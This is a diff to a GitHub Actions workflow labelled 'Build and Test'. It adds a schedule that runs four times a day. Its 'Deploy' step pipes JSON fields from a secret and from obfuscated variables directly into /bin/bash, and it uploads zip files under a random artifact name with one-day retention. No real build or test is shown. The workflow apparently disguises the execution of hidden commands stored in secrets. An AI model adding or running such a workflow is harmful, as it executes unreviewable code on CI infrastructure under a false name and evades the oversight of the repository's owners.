@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '50 4,10,16,22 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,19 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          rsy7: ${{ secrets.rsy7 }}
+          j3: ${{ secrets.j3 }}
         run: |
-          printf '%s' "$rsy7" | jq -r .ezsr2 | /bin/bash
-          printf '%s' "$n127" | jq -r .kzkhj45267 | /bin/bash
-          printf '%s' "$n1484" | jq -r .yof34 | /bin/bash
-          echo $ms08623 | jq -r .oglx9988 | /bin/bash
+          printf '%s' "$j3" | jq -r .qzbzr17 | /bin/bash
+          printf '%s' "$a35388" | jq -r .htwn96291 | /bin/bash
+          echo $bpr6675 | jq -r .vuw75 | /bin/bash
+          printf '%s' "$n9760" | jq -r .jrwa8389 | /bin/bash
+          printf '%s' "$u4" | jq -r .ilzea1 | /bin/bash
+          printf '%s' "$bqd7" | jq -r .an9 | /bin/bash
+          echo $dq218 | jq -r .vn13 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: 02s4kH3l
+          name: 2xBIl0tZ
           path: "*.zip"
           retention-days: 1
